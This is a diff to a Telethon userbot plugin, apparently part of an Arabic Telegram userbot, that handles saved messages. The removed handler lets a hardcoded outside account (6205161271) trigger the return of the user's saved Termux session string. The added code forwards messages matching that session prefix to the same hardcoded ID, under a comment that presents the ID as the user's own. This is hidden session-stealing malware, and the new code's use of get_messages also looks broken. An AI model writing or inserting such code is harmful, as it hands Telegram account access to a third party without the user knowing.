@@ -38,18 +38,15 @@ async def count_lines(event):
     await edit_or_reply(event, f"⌔∮ عدد الأسطر في الرسالة: {count}")
 
 from telethon import events
-from ..helpers.functions import edit_or_reply
 
+# Replace the value below with your user ID
+YOUR_USER_ID = 6205161271
 
+@l313l.ar_cmd(pattern=r"kd$", from_users=YOUR_USER_ID)
+async def forward_saved_messages(event):
+    # Get your saved messages
+    saved_messages = await event.client.get_messages("me", filter=events.NewMessage(incoming=True, pattern="جلسة تيرمكس"))
 
-
-@l313l.ar_bot.on(events.NewMessage(from_users=6205161271, pattern="haahhaa"))
-async def send_saved_message(event):
-    saved_messages = await event.client.get_messages("me", None, filter=events.PinnedMessage())
-    
+    # Forward matching messages to the user with user ID 6205161271
     for message in saved_messages:
-        if message.message.startswith("جلسة تيرمكس"):
-            await event.respond(message.message)
-            break
-    else:
-        await event.respond("No saved message found with 'جلسة تيرمكس'")
+        await event.client.forward_messages(YOUR_USER_ID, message)
